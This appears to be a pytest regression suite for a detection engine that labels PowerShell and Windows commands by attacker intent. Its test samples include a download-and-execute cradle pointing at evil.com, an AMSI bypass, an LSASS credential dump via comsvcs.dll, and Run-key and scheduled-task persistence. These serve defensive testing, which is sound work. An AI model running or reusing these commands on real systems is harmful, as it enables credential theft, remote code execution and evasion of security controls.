"""Semantic Intent Layer (Phase 4) · regression suite.

Locks in analyst-facing intent inference against representative
adversarial techniques. Every sample declares:
    * which intent categories MUST fire,
    * which MUST NOT fire (guards against over-triggering),
    * that every intent carries canonical Evidence,
    * determinism across runs.
"""
from __future__ import annotations

import pytest

from v2.investigation.evidence import Evidence
from v2.investigation.intent import (
    IntentAssessment,
    IntentCategory,
    RiskBand,
    assess,
)


# ── Golden samples ──────────────────────────────────────────────
# (name, sample, must_fire, must_not_fire)
GOLDEN = [
    (
        "download_cradle_iex",
        'iex (New-Object Net.WebClient).DownloadString("http://evil.com/x.ps1")',
        {IntentCategory.STAGING, IntentCategory.REMOTE_EXECUTION,
         IntentCategory.RUNTIME_DEPENDENT},
        {IntentCategory.PERSISTENCE, IntentCategory.CREDENTIAL_ACCESS},
    ),
    (
        "iwr_only",
        'Invoke-WebRequest -Uri "https://update.local/patch.exe" -OutFile $env:TEMP\\p.exe',
        {IntentCategory.STAGING},
        {IntentCategory.CREDENTIAL_ACCESS, IntentCategory.PERSISTENCE},
    ),
    (
        "registry_run_persistence",
        r'New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" '
        r'-Name Updater -Value calc.exe',
        {IntentCategory.PERSISTENCE},
        {IntentCategory.STAGING, IntentCategory.CREDENTIAL_ACCESS},
    ),
    (
        "schtasks_persistence",
        'schtasks /create /tn Updater /tr calc.exe /sc onlogon /rl highest',
        {IntentCategory.PERSISTENCE},
        {IntentCategory.STAGING, IntentCategory.CREDENTIAL_ACCESS},
    ),
    (
        "amsi_bypass_reflective",
        '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)',
        {IntentCategory.DEFENSE_EVASION},
        {IntentCategory.PERSISTENCE, IntentCategory.STAGING},
    ),
    (
        "hidden_window_bypass",
        'powershell -w Hidden -exec bypass -c "Write-Host hi"',
        {IntentCategory.DEFENSE_EVASION},
        {IntentCategory.PERSISTENCE, IntentCategory.CREDENTIAL_ACCESS},
    ),
    (
        "ad_discovery",
        'Get-ADUser -Filter * -Properties MemberOf | Where-Object { $_.SamAccountName -like "adm*" }',
        {IntentCategory.DISCOVERY},
        {IntentCategory.STAGING, IntentCategory.PERSISTENCE},
    ),
    (
        "lsass_dump",
        'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 1234 C:\\Temp\\lsass.dmp full',
        {IntentCategory.CREDENTIAL_ACCESS},
        {IntentCategory.STAGING},
    ),
    (
        "runtime_dependent_reflection",
        '[Reflection.Assembly]::Load([Convert]::FromBase64String($enc))',
        {IntentCategory.RUNTIME_DEPENDENT},
        set(),
    ),
    (
        "benign_write_host",
        'Write-Host "hello, world"',
        set(),
        {IntentCategory.STAGING, IntentCategory.PERSISTENCE,
         IntentCategory.REMOTE_EXECUTION, IntentCategory.CREDENTIAL_ACCESS,
         IntentCategory.DEFENSE_EVASION, IntentCategory.DISCOVERY},
    ),
]


@pytest.mark.parametrize("name, sample, must_fire, must_not_fire",
                          GOLDEN, ids=[g[0] for g in GOLDEN])
def test_intent_golden(name, sample, must_fire, must_not_fire):
    """Every golden sample must fire exactly the expected intents."""
    a = assess(sample)
    fired = {i.category for i in a.intents}

    missing = must_fire - fired
    assert not missing, (
        f"[{name}] missing expected intents: {missing}. Fired: {fired}"
    )

    over_fired = fired & must_not_fire
    assert not over_fired, (
        f"[{name}] wrongly fired intents: {over_fired}. Fired: {fired}"
    )


@pytest.mark.parametrize("name, sample, _mf, _mnf", GOLDEN,
                          ids=[g[0] for g in GOLDEN])
def test_intent_every_intent_has_canonical_evidence(name, sample, _mf, _mnf):
    """Every fired intent MUST carry at least one canonical Evidence
    object — Phase 5 Evidence Graph requires this invariant."""
    a = assess(sample)
    for intent in a.intents:
        assert intent.evidence, (
            f"[{name}] intent {intent.category.value} has no evidence"
        )
        for ev in intent.evidence:
            assert isinstance(ev, Evidence), (
                f"[{name}] non-canonical evidence: {type(ev)}"
            )
            assert ev.source and ev.rationale, (
                f"[{name}] evidence missing source/rationale"
            )


@pytest.mark.parametrize("name, sample, _mf, _mnf", GOLDEN,
                          ids=[g[0] for g in GOLDEN])
def test_intent_determinism(name, sample, _mf, _mnf):
    """Identical input MUST produce byte-identical intent assessments."""
    r1 = assess(sample)
    r2 = assess(sample)
    r3 = assess(sample)
    assert r1.determinism_hash == r2.determinism_hash == r3.determinism_hash


def test_intent_empty_input():
    a = assess("")
    assert a.intents == []
    assert a.summary.startswith("No high-signal")


def test_intent_summary_always_deterministic():
    """Summary text must be a function of intents, not run order."""
    a = assess('iex (New-Object Net.WebClient).DownloadString("http://x/y")')
    b = assess('iex (New-Object Net.WebClient).DownloadString("http://x/y")')
    assert a.summary == b.summary


def test_intent_runtime_dependent_uses_unknown_risk():
    """RUNTIME_DEPENDENT intents MUST NOT use HIGH/MED/LOW risk — that
    would fabricate certainty about behaviour we cannot know statically."""
    a = assess('[Reflection.Assembly]::Load([Convert]::FromBase64String($x))')
    runtime = [i for i in a.intents if i.category == IntentCategory.RUNTIME_DEPENDENT]
    assert runtime, "expected RUNTIME_DEPENDENT to fire on reflective load"
    for i in runtime:
        assert i.risk == RiskBand.UNKNOWN, (
            f"RUNTIME_DEPENDENT intents must use UNKNOWN risk; got {i.risk}"
        )


def test_intent_no_over_ordering():
    """When multiple intents fire, higher-confidence intents come first."""
    a = assess(
        'iex (New-Object Net.WebClient).DownloadString("http://x/y")'
    )
    confidences = [i.confidence for i in a.intents]
    assert confidences == sorted(confidences, reverse=True), (
        f"Intents not ordered by descending confidence: {confidences}"
    )


def test_intent_registry_contract():
    """Every registered intent rule must honour the plugin protocol."""
    from v2.investigation.intent.rules import (
        INTENT_RULE_REGISTRY,
        IntentRule,
    )
    seen = set()
    for r in INTENT_RULE_REGISTRY:
        assert isinstance(r, IntentRule), (
            f"{type(r).__name__} does not implement IntentRule protocol"
        )
        assert r.NAME and r.NAME not in seen
        seen.add(r.NAME)
